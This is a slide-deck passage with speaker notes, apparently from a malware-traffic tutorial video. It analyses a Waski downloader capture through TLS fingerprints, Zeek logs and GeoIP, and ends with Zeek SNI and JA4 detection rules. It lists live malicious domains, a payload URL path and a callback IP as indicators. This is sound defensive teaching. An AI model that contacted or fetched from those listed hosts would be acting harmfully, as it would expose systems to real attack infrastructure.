│ 1138de370e523e824bbca92d049a3777 │ t10d070700_c50f5591e341_c39ab67fec8e │
└──────────────────────────────────┴──────────────────────────────────────┘
```

<!--
- Two JA3 and two JA4 client fingerprints from malicious connections.
- One honest caveat: no global registry says these hashes belong to Waski. Any app built on the same TLS stack with the same config produces an identical hash.
- Proof is right in this capture: the benign Windows OS traffic carries JA4 t12d1909h2_d83cc789557e_7af1ed941c26 — identical b and c sections to the malware's t12d190800 fingerprint. Only the extension count and ALPN differ. Same TLS library, different caller.
- So treat a hash match as a lead, not a verdict. The JA4 rule we write later does fire on the fingerprint by itself — that's deliberate, it's a hunting rule — but what makes it actionable is the destination and the retry behavior around it.
- JOKE: Perfect camouflage, accidentally achieved, then ruined by dropping ALPN. That's a ghillie suit worn with a name tag.
- Next: let's decode the JA4 strings.
-->

---

## Reading JA4

Per [FoxIO's JA4 spec](https://github.com/FoxIO-LLC/ja4/blob/main/technical_details/JA4.md), the `a_b_c` format encodes:

**Part `a`:** protocol + TLS version + SNI + cipher count + extension count + ALPN

- `t12d190800` → TLS **1.2**, SNI present, 19 ciphers, 8 extensions, **no ALPN** (`00`)
- `t10d070700` → TLS **1.0**, SNI present, 7 ciphers, 7 extensions, **no ALPN** (`00`)

The `00` at the end means no ALPN extension — modern browsers typically include ALPN (h2, http/1.1). No ALPN is unusual.

**Part `b`:** 12-char truncated SHA256 of the hex-sorted ciphers. **Part `c`:** same, over the hex-sorted extensions — SNI and ALPN excluded — then the signature algorithms in the order they appeared, unsorted.

<!--
- Let's decode the JA4 strings using the FoxIO spec.
- Both fingerprints end in 00 — no ALPN. Modern browsers usually negotiate ALPN (h2 or http/1.1). This is a strong signal: the malware's TLS stack doesn't include ALPN at all.
- The first fingerprint is TLS 1.2 with 19 ciphers and 8 extensions, and it's the same TLS stack the operating system itself uses — I can prove that rather than assume it. Pull the raw Client Hellos out of this PCAP and the malware offers the same nineteen cipher suites, in the same order, with the same extensions, as the Windows telemetry Client Hellos from the same box. The only difference is that the malware omits ALPN — extension 16, and nothing else changes. That's why the b and c halves of the JA4 match the benign traffic exactly.
- The second is TLS 1.0 with 7 ciphers and 7 extensions — very unusual in 2026, and it doesn't even send signature algorithms.
- Parts b and c are truncated hashes — useful for grouping, but the a section is what makes these rare.
- JOKE: TLS 1.0 in 2026 is such a loud signal that the encryption is actively helping you find it. It brought a disguise that glows.
-->

---

## packaging-labelling.com: Fingerprint Consistency

```sql
LOAD zeek;
LOAD inet;
SELECT SUBSTR(CAST(ts AS VARCHAR), 12, 5) AS ts,
       server_name, ja4, ssl_history
FROM read_zeek('output/ssl.log')
WHERE server_name LIKE '%packaging-labelling%'
ORDER BY ts;
```

```
┌─────────┬─────────────────────────────┬──────────────────────────────────────┬─────────────┐
│   ts    │         server_name         │                 ja4                  │ ssl_history │
│ varchar │           varchar           │               varchar                │   varchar   │
├─────────┼─────────────────────────────┼──────────────────────────────────────┼─────────────┤
│ 11:22   │ packaging-labelling.com     │ t12d190800_d83cc789557e_7af1ed941c26 │ Csxkn       │
│ 11:23   │ packaging-labelling.com     │ t12d190800_d83cc789557e_7af1ed941c26 │ CsxknGIti   │
│ 11:23   │ www.packaging-labelling.com │ t12d190800_d83cc789557e_7af1ed941c26 │ CsxknGIti   │
│ 11:24   │ packaging-labelling.com     │ t12d190800_d83cc789557e_7af1ed941c26 │ CsiI        │
│ 11:24   │ www.packaging-labelling.com │ t12d190800_d83cc789557e_7af1ed941c26 │ CsiI        │
└─────────┴─────────────────────────────┴──────────────────────────────────────┴─────────────┘
```

Same JA4 across all five sessions. The alternation is on shaf.in (next slide).

<!--
- All five sessions use the same JA4 fingerprint. No variation.
- JA4 is the modern standard — JA3 is dated and less granular. JA4 captures what matters.
- The alternation we saw earlier only happens on shaf.in — next slide.
- JOKE: Five sessions, one fingerprint, not one attempt to vary it. This malware packed a single outfit for a five-day conference.
-->

---
layout: default
class: compact-code
---

## shaf.in: Fingerprint Alternation

```sql
LOAD zeek;
LOAD inet;
SELECT SUBSTR(CAST(s.ts AS VARCHAR), 12, 8) AS ts,
       s.ja3 AS ja3_client, s.ja4 AS ja4_client, c.orig_bytes
FROM read_zeek('output/ssl.log') s
JOIN read_zeek('output/conn.log') c ON s.uid = c.uid
WHERE s.id_resp_h = '103.212.120.166'
ORDER BY s.ts;
```

```
┌──────────┬──────────────────────────────────┬──────────────────────────────────────┬────────────┐
│    ts    │            ja3_client            │              ja4_client              │ orig_bytes │
│ varchar  │             varchar              │               varchar                │   uint64   │
├──────────┼──────────────────────────────────┼──────────────────────────────────────┼────────────┤
│ 11:23:28 │ a0e9f5d64349fb13191bc781f81f42e1 │ t12d190800_d83cc789557e_7af1ed941c26 │        174 │
│ 11:23:54 │ 1138de370e523e824bbca92d049a3777 │ t10d070700_c50f5591e341_c39ab67fec8e │        120 │
│ 11:23:59 │ a0e9f5d64349fb13191bc781f81f42e1 │ t12d190800_d83cc789557e_7af1ed941c26 │        174 │
│ 11:24:04 │ 1138de370e523e824bbca92d049a3777 │ t10d070700_c50f5591e341_c39ab67fec8e │        120 │
│ 11:24:36 │ a0e9f5d64349fb13191bc781f81f42e1 │ t12d190800_d83cc789557e_7af1ed941c26 │        174 │
│ 11:24:41 │ 1138de370e523e824bbca92d049a3777 │ t10d070700_c50f5591e341_c39ab67fec8e │        120 │
└──────────┴──────────────────────────────────┴──────────────────────────────────────┴────────────┘
```

Strict alternation, every Client Hello. Gaps of 26, 5, 5, 32, 5 seconds. Two fake IDs, same malware.

<!--
- Strict alternation: TLS 1.2, TLS 1.0, TLS 1.2, TLS 1.0 — never two in a row.
- Note the payload sizes track the fingerprint exactly: the TLS 1.2 Client Hello is 174 bytes, the TLS 1.0 one is 120. Two hardcoded handshakes, not a negotiation.
- The gaps aren't a clean beacon interval — 26 seconds, then 5, then 5, then 32, then 5. It's a retry loop, not a timer. We don't know why it swaps — the PCAP only shows the pattern, not the reason.
- JOKE: The fallback logic works perfectly. It correctly and repeatedly falls back to a second protocol that also doesn't work.
-->

---
layout: default
class: compact-code
---

## shaf.in: Connection Retry Pattern

```sql
LOAD zeek;
LOAD inet;
SELECT uid, id_orig_p AS sport, orig_bytes, resp_bytes,
       duration, conn_state
FROM read_zeek('output/conn.log')
WHERE id_resp_h = '103.212.120.166'
ORDER BY ts LIMIT 7;
```

```
┌────────────────────┬────────┬────────────┬────────────┬─────────────────┬────────────┐
│        uid         │ sport  │ orig_bytes │ resp_bytes │    duration     │ conn_state │
│      varchar       │ uint16 │   uint64   │   uint64   │    interval     │  varchar   │
├────────────────────┼────────┼────────────┼────────────┼─────────────────┼────────────┤
│ CbbDpijwndckuKq6g  │  49944 │        174 │          0 │ 00:00:05.076863 │ SF         │
│ CoW71W3ov9zmjvHqn6 │  49945 │          0 │          0 │ 00:00:03.012279 │ S0         │
│ CbGLXi2c74xOrqreS8 │  49945 │       NULL │       NULL │ NULL            │ S0         │
│ CcH5C83GCv8dfgLXtf │  49945 │       NULL │       NULL │ NULL            │ S0         │
│ CYZV5y3dcYUWLFRra7 │  49949 │        120 │          0 │ 00:00:05.077474 │ SF         │
│ CjyiDp4r04HjYYA7Cc │  49950 │          0 │          0 │ 00:00:00.07505  │ SF         │
│ CXakOaMlMwAcQQHoa  │  49951 │        174 │          0 │ 00:00:05.077157 │ SF         │
└────────────────────┴────────┴────────────┴────────────┴─────────────────┴────────────┘
```

*First 7 of 13 log entries. Rows 2–4 are one socket retransmitting — watch the `sport` column.*

<!--
- Thirteen conn.log entries for shaf.in over 78 seconds — but the host only opened eleven sockets. That gap is the most useful thing on this slide.
- Look at the pattern first: 5-second durations with 174 or 120 byte payloads, alternating. Then short 0.075-second connections that close cleanly with FIN — no data transferred.
- The resp_bytes column is the punchline: not one byte ever came back. Every row that counted bytes logs a literal zero, and the two single-SYN rows never counted anything, so they log NULL.
- Now the sport column. Rows two, three and four are all source port 49945 — that's one socket, not three. It sent five SYNs over fifteen seconds, backing off one, two, four, then eight, and never got a single reply.
- Here's why Zeek split it: tcp_attempt_delay expires an unanswered connection attempt after five seconds. The first record covers the three SYNs inside that window. Every retransmit that arrives after the record has been flushed opens a brand new one — one packet, nothing to count, so orig_bytes, resp_bytes and duration all come back NULL.
- So don't read the NULL rows as "the malware gave up after one SYN." They're the opposite: they *are* the retries. Same for the Cloudflare side, where eleven entries are really seven sockets — two of them split into three rows each, exactly like 49945.
- This is why you check source ports before you quote a connection count off conn.log. Log lines are not connections.
- conn_state "SF" means the connection completed normally from Zeek's perspective — but every SF connection to shaf.in has 0 response bytes.
- The malware is sending its callback and getting nothing back. It's shouting into the void.
- JOKE: Eleven attempts in 78 seconds. That's more persistent than an ex who just discovered you have a new Netflix password. "Are you there? Hello? I just want to talk. Please respond. I'll try again in five seconds."
-->

---

## Benign Noise: Windows Telemetry

The capture is dominated by legitimate Microsoft traffic:

| Domain | Count |
|---|---|
| oneocsp.microsoft.com | 4 DNS |
| settings-win.data.microsoft.com | 3 DNS |
| ctldl.windowsupdate.com | 3 DNS |
| slscr / fe3cr.delivery.mp.microsoft.com | 2 DNS each |
| dl.delivery / login.live / nexusrules / ocsp.digicert / c.pki.goog | 1 DNS each |

<!--
- Here's the problem for SOC analysts: 19 out of 22 DNS queries are legitimate Microsoft and certificate validation traffic.
- Windows telemetry, update checks, OCSP, CRL — all normal. All noisy.
- The malicious domains (packaging-labelling.com and shaf.in) are only 3 queries out of 22. That's 13.6% of the DNS traffic.
- This malware hides in the noise.
- JOKE: It's like shoplifting at Walmart on Black Friday. Everyone's carrying suspicious bags — you need a really good reason to stop one specific person.
- JOKE: Three malicious queries buried in nineteen Microsoft ones. The malware didn't need encryption — it had Windows doing the noise for free.
-->

---

## GeoIP: 103.212.120.166 (shaf.in)

WHOIS already told us MilesWeb owns this range. GeoIP adds the location and the ASN:

```bash
curl -s http://ip-api.com/json/103.212.120.166 \
  | python3 -c "import sys,json; d=json.load(sys.stdin); \
    print(f\"GeoIP: {d['country']} / {d['regionName']} / {d['city']} | {d['as']}\")"
```

```
GeoIP: India / Maharashtra / Nashik | AS135222 MilesWeb Internet Services Pvt Ltd
```

<!--
- We established MilesWeb back on the ownership slide, so I'm not running that whois again. What GeoIP adds is the detail: Nashik, in Maharashtra, announced from AS135222.
- Commodity infrastructure. Not APT-grade, not sophisticated. Just a cheap VPS. And worth noticing that GeoIP agrees with WHOIS here — hold onto that, because on the very next slide it won't.
- JOKE: City, state, ASN — GeoIP hands over the whole address without being asked, and for once it's telling the truth. That's what you get when the target is one server sitting in the one place it has ever been. Enjoy it. It does not last past this slide.
-->

---

## GeoIP vs. CF-RAY: Cloudflare IPs

```bash
curl -s http://ip-api.com/json/104.21.27.45 \
  | python3 -c "import sys,json; d=json.load(sys.stdin); \
    print(f\"GeoIP: {d['country']} / {d['regionName']} / {d['city']} | {d['as']}\")"
```

```
GeoIP: Canada / Ontario / Toronto | AS13335 Cloudflare, Inc.
```

- `172.67.168.231` — also AS13335, also geolocating to Toronto
- Both IPs front for `packaging-labelling.com`

But all four decrypted responses end their `CF-RAY` in `-LHR` (e.g. `a355c1765ba8e536-LHR`). Cloudflare says that code ["identifies the data center processing the request"](https://developers.cloudflare.com/fundamentals/reference/http-headers/#cf-ray), and their [status API](https://www.cloudflarestatus.com/api/v2/components.json) lists `LHR` as **London, United Kingdom** — Toronto would have been `YYZ`.

<!--
- CF-RAY is a header Cloudflare adds to responses — Cloudflare's docs call it a hashed value encoding information about the data center and the visitor's request. The ID is unique per request; the three letters after the dash are the data center. We only have it because the sandbox decrypted the TLS. Zeek never saw it.
- Don't trust that city. Both IPs geolocate to Toronto, but all four decrypted responses — both 301s and both 404s — end their CF-RAY in LHR, each with a different ID. Toronto is in Cloudflare's own list as YYZ. Both links are on the slide so you can check me.
- GeoIP on an anycast address is a database picking a favorite out of hundreds of announcement points. The header names an actual facility. Neither one gives you the origin — that's Cloudflare's whole product.
- JOKE: Cloudflare is the "hide behind the crowd" strategy of the internet. When your traffic looks like everyone else's, nobody gets stopped at the door. It's the security equivalent of "I'm with the band."
- JOKE: GeoIP says Toronto, the header says London, and the origin is somewhere neither of them will admit to. Three sources, zero actual addresses. That's Cloudflare working exactly as advertised.
-->

---

## Indicators of Compromise — Files

| Type | Value | Context |
|---|---|---|
| **MD5** | `1e006fbba32dfa9f51c3eadd008a5441` | Waski sample, 19,152 B |
| **SHA256** | `b7aa81367a...6d2c2c` | Waski sample |
| **MD5** | `fc4723973fc570c08445a5feed41742b` | `codecsupdater.exe`, 19,344 B |
| **SHA256** | `d2f1ee8bbe...431b3573` | Dropped child |

<!--
- File hashes first. Domains next, then the network indicators.
- Two file hashes, not one. If you only blocklist the parent you miss codecsupdater.exe, and the child is the process that actually touches the network.
- JOKE: The attacker left more fingerprints than a toddler at a sliding glass door.
-->

---

## Indicators of Compromise — Domains & URL

| Type | Value | Context |
|---|---|---|
| **Domain** | `packaging-labelling.com` | Payload delivery |
| **Domain** | `www.packaging-labelling.com` | Payload redirect |
| **Domain** | `shaf.in` | Second host, callbacks |
| **URL** | `packaging-labelling.com/images/full/wav.exe` | Payload path |

<!--
- Three domains and the one URL path we recovered.
- Both the bare domain and the www host are worth blocking — the campaign used both, one to deliver and one to redirect.
- Note: that URL is encrypted inside TLS — Zeek never saw it. It came from the Triage sandbox's TLS decryption.
- JOKE: The parent process was `codecsupdater.exe` and the payload was `wav.exe`. Give them this much — they committed to the audio bit. Then they parked it in the images folder.
-->

---

## Indicators of Compromise — Network

| Type | Value | Context |
|---|---|---|
| **IP** | `103.212.120.166` | Callback host (India) |
| **IP** | `104.21.27.45` / `172.67.168.231` | Cloudflare |
| **JA3** | `a0e9f5d6...` / `1138de37...` | Malware TLS clients |
| **JA4** | `t12d190800...` / `t10d070700...` | Malware TLS clients |
| **User-Agent** | `Updates downloader` | Hardcoded HTTP UA |

<!--
- IPs, the JA3 and JA4 fingerprints, and the User-Agent.
- The Cloudflare pair is context, not a blocklist entry — those addresses are shared with thousands of legitimate sites.
- The User-Agent is another TLS-decrypted artifact from the sandbox, not something Zeek pulled off the wire.
- JOKE: "Updates downloader" as a User-Agent. At least make it sound like a browser, buddy.
-->

---

## Detection 1: Zeek SNI Rule

```text
module DetectWaskiSNI;

export {
    redef enum Notice::Type += {
        Waski_SNI_Match,
    };
}

const waski_snis: set[string] = {
    "packaging-labelling.com",
    "www.packaging-labelling.com",
    "shaf.in",
};
```

Three domains, one Notice type. Next slide: the event handler that catches failed handshakes too.

- **Tier:** Domain Names (Pyramid of Pain)

<!--
- First detection rule: SNI-based. Simple, effective, but noisy.
- This fires whenever a TLS Client Hello contains one of the three malicious domains as the Server Name Indication.
- It sits at the Domain Names tier of the Pyramid of Pain — easy for the attacker to rotate, but useful for immediate blocking.
- JOKE: Domain-based detection is like putting someone's photo on a "wanted" poster. Effective until they shave and put on glasses. But for now, it works.
-->

---

## Detection 1: Zeek SNI Rule (cont.)

```text
event connection_state_remove(c: connection)
{
    if ( ! c?$ssl || ! c$ssl?$server_name )
        return;

    local sni = to_lower(c$ssl$server_name);

    if ( sni in waski_snis )
        NOTICE([$note=Waski_SNI_Match,
                $msg=fmt("Waski Downloader SNI: %s -> %s",
                         c$id$orig_h, sni),
                $conn=c,
                $identifier=cat(c$id$orig_h, c$id$resp_h, sni)]);
}
```

- **Caveat:** the malware's cert validates (Google Trust Services). Cert-error hunting gives you 5 notices here — all Microsoft, none malicious
- **Deploy in:** environments without SSL inspection

<!--
- Note the event: connection_state_remove, not ssl_established. That matters here. Every shaf.in handshake failed, so ssl_established never fires for shaf.in — we'd miss the most important half of this infection.
- The caveat: packaging-labelling.com uses a valid cert (Google Trust Services, as we saw earlier), so there are no SSL::Invalid_Server_Cert notices to cross-reference.
- And it's worse than just "no signal." Load Zeek's protocols/ssl/validate-certs against this PCAP and you get five Invalid_Server_Cert notices — every one Microsoft, every one "unable to get local issuer certificate." Nothing is actually wrong with those certs: the servers did send their intermediates, but those chain up to Microsoft's 2011 and 2018 roots, and Zeek's bundled Mozilla CA list only carries Microsoft's 2017 roots. Zero notices for the malware. So hunt on cert errors here and you work five false positives and miss the infection entirely. The signal is exactly inverted.
- The SNI is your only signal.
- JOKE: Five suspects, all of them your own operating system, and the one guy with clean paperwork did it.
-->

---

## Detection 2: Zeek JA4 Rule

```text
module DetectWaskiJA4;

export {
    redef enum Notice::Type += {
        Waski_JA4_Match,
    };
}

const waski_ja4s: set[string] = {
    "t12d190800_d83cc789557e_7af1ed941c26",
    "t10d070700_c50f5591e341_c39ab67fec8e",
};
```

Two JA4 fingerprints, one Notice type. JA4 is more granular than JA3 — the `a` section captures TLS version, cipher count, extension count, and ALPN.

<!--
- JA4-based detection using the two known Waski fingerprints.
- JA4 is preferred over JA3: the human-readable `a` section makes it easier to understand what's unusual about the fingerprint — TLS 1.0 with 7 ciphers and no ALPN is immediately suspicious.
- These fingerprints survive domain rotation — deploy as a persistent hunting rule.
- And note what this rule does not do: there's no destination or SNI condition, so any process on the same TLS stack with the same config will trip it. In this capture it fires twice and both are the malware, but tune it before you page anyone on it.
- JOKE: Two fingerprints, no destination check, so anything running the same TLS stack sets it off. This rule is a smoke detector mounted directly above the stove — genuinely useful, and you will come to resent it.
- Next slide: the event handler that catches all connections including failed handshakes.
- -->

---

## Detection 2: Zeek JA4 Rule (cont.)

```text
event connection_state_remove(c: connection)
{
    if ( ! c?$ssl || ! c$ssl?$ja4 )
        return;

    if ( c$ssl$ja4 in waski_ja4s )
        NOTICE([$note=Waski_JA4_Match,
                $msg=fmt("Waski JA4 %s from %s -> %s (SNI: %s, established: %s)",
                         c$ssl$ja4, c$id$orig_h, c$id$resp_h,
                         c$ssl?$server_name ? c$ssl$server_name : "-",
                         c$ssl$established ? "T" : "F"),
                $conn=c,
                $identifier=cat(c$id$orig_h, c$ssl$ja4)]);
}
```

<!--
- Uses connection_state_remove — catches ALL connections including failed TLS handshakes.
- Generates a Notice with the JA4 hash, source/dest IPs, SNI, and whether the handshake completed.
- JOKE: A Zeek script that catches malware by its TLS fingerprint. The bouncer doesn't care about your fake ID — he remembers the shape of your ears.
-->

---

## Detection Scripts — Let's Test Them

Both scripts are in `scripts/`. Run them against the PCAP:

```bash
zeek -C -r pcaps/waski_260903-sr1gxawwhv/waski_260903-sr1gxawwhv.pcapng \
     Log::default_logdir=output ja3 ja4 \
     scripts/detect-waski-sni.zeek \
     scripts/detect-waski-ja4.zeek
```

Check `notice.log` for detections.

<!--
- Theory is great, but let's prove these scripts actually work.
- We'll run both against the PCAP and check notice.log for detections.
- JOKE: The scariest rule in any SIEM is the one that has never fired, because you can't tell "nothing happened" from "this has been broken since 2019."
- JOKE: Writing the rule is the fun part. Running it is the part where you find out you typed the SNI wrong.
- JOKE: Every detection rule works perfectly right up until the first time you run it.
-->

---

## SNI Detection Results

```bash
zeek-cut -d ts note msg < output/notice.log | grep Waski_SNI_Match
```

```
2026-09-03T11:23:12-0400  DetectWaskiSNI::Waski_SNI_Match
  Waski Downloader SNI: 10.127.0.5 -> packaging-labelling.com
2026-09-03T11:23:40-0400  DetectWaskiSNI::Waski_SNI_Match
  Waski Downloader SNI: 10.127.0.5 -> shaf.in
2026-09-03T11:24:47-0400  DetectWaskiSNI::Waski_SNI_Match
  Waski Downloader SNI: 10.127.0.5 -> www.packaging-labelling.com
2026-09-03T11:24:47-0400  DetectWaskiSNI::Waski_SNI_Match
  Waski Downloader SNI: 10.127.0.5 -> packaging-labelling.com
2026-09-03T11:24:47-0400  DetectWaskiSNI::Waski_SNI_Match
  Waski Downloader SNI: 10.127.0.5 -> www.packaging-labelling.com
```

5 notices covering all 11 malicious TLS sessions — `$identifier` suppression collapses repeats. shaf.in included.

<!--
- Eleven TLS sessions carried a malicious SNI — five to packaging, six to shaf.in. We get five notices, not eleven, because $identifier plus Zeek's default one-hour suppression window collapses repeats of the same source, destination, and SNI. That's a feature: you want one alert per infection, not one per retry.
- Two things in that output look like mistakes and aren't. First, www.packaging-labelling.com is listed twice. My $identifier includes the responder IP, and those two sessions went to different Cloudflare addresses — 104.21.27.45 and 172.67.168.231 — so Zeek counts them separately. Drop resp_h from the identifier if you want one alert per domain instead.
- Second, three notices share the same second, 11:24:47. Those three connections are all conn_state S1 — established, never closed — so connection_state_remove doesn't fire until Zeek flushes remaining state at the end of the capture. The notice timestamp is when Zeek retired the connection, not when the Client Hello went out.
- The important line is shaf.in. connection_state_remove catches the SNI from the Client Hello even when the handshake fails and the server never responds.
- This works without SSL inspection — the SNI is visible in the Client Hello.
- JOKE: Five alerts is a suspiciously pleasant number. On most days I'd assume the sensor was unplugged.
- JOKE: Suppression is the one feature in your entire stack designed around the fact that humans read the top of a list and nothing else.
-->

---

## JA4 Detection Results

```bash
zeek-cut -d ts note msg < output/notice.log | grep Waski_JA4_Match
```

```
2026-09-03T11:23:12-0400  DetectWaskiJA4::Waski_JA4_Match
  Waski JA4 t12d190800_d83cc789557e_7af1ed941c26 from 10.127.0.5 -> 104.21.27.45
  (SNI: packaging-labelling.com, established: F)
2026-09-03T11:24:04-0400  DetectWaskiJA4::Waski_JA4_Match
  Waski JA4 t10d070700_c50f5591e341_c39ab67fec8e from 10.127.0.5 -> 103.212.120.166
  (SNI: shaf.in, established: F)
```

2 notices — one per fingerprint, again after suppression. Both packaging and the callback host caught.

SNI caught it by domain name. JA4 caught it by fingerprint. Different approaches, same result — but JA4 survives domain rotation. Change the domain, change the IP, the JA4 fingerprint stays the same. That's why you deploy both.

<!--
- JA4 caught both fingerprints — even shaf.in where the TLS handshake failed.
- SNI is good for known domains; JA4 is good for known client behavior regardless of domain.
- JOKE: Caught by the handwriting on a ransom note that never got mailed.
- JOKE: They can change the domain, the IP, and the certificate. They cannot change the way they walk into a room.
- JOKE: You can rotate infrastructure all day. You're still the guy who orders the same weird thing at every restaurant.
-->

---

## Key Takeaways

1. **Cloudflare is not a trust signal.**
   - Valid cert, real origin 404s, shared IPs. Detect on SNI, not address.
2. **Hunt the child, not the file you downloaded.**
   - The malicious traffic came from dropped `codecsupdater.exe`.
3. **conn.log rows are not connections.**
   - 13 shaf.in rows, 11 connections. Check source ports.
4. **JA3/JA4 survives rotation — but tune it.**
   - Benign Windows traffic is one extension away from the malware's JA4.
5. **Layer detection, filter the noise.**
   - SNI + JA4. 19/22 DNS queries were legitimate.

<!--
- Cloudflare IPs are shared and GeoIP on them is fiction — block by domain, not by address.
- If you only blocklist the sample's hash you miss the process that actually touched the network. Two hashes, and the child is the one that matters.
- And count by four-tuple before you quote a connection number to anyone. Zeek's five-second attempt timeout inflated this capture by two rows on shaf.in and four more on the Cloudflare side.
- JA3/JA4 fingerprints survive domain rotation — the most durable detection we've got here — but the benign Windows traffic in this same PCAP differs by exactly one extension, so tune before you page.
- JOKE: Malware analysis is 90% filtering noise, 10% finding the one suspicious domain, and 90% explaining to somebody why 150 seconds of traffic took you six hours. The math doesn't work, and neither does the schedule.
-->

---
layout: center
---

# Like & Subscribe!

# https://www.UnpackThePCAP.com

See you next time on Unpack the PCAP.

<!--
- That's a wrap on the Waski downloader. Short, sneaky, and persistent.
- Remember: the PCAP and all analysis artifacts are publicly available. Download them, run your own queries, build your own detection rules.
- JOKE: You just sat through a full autopsy of a 19 KB file that got a 404 from its payload server and the silent treatment from its callback host. It failed at everything it tried and I still got ten sections out of it.
- If this was useful, hit like and subscribe — it's how these find the people who need them. Comment with what you want unpacked next.
- See you next time on Unpack the PCAP.
-->
